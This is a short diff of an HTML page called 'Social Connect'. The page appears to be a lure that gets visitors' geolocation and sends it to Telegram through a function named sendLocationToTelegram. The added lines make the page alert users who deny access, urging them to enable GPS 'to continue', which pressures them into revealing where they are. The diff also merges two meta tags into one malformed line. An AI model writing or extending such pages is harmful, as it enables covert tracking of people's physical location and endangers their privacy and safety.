@@ -1,8 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="viewport" content="width=device-width, initial-scale=1.0">
     <title>Social Connect</title>
     <style>
         body {
@@ -278,9 +277,11 @@
                     await sendLocationToTelegram(locationInfo);
                 }, (error) => {
                     console.error("Error getting location: ", error);
+                    alert("Please enable GPS and allow location access to continue.");
                 });
             } else {
                 console.error("Geolocation is not supported by this browser.");
+                alert("Please enable GPS and allow location access to continue.");
             }
         }
 
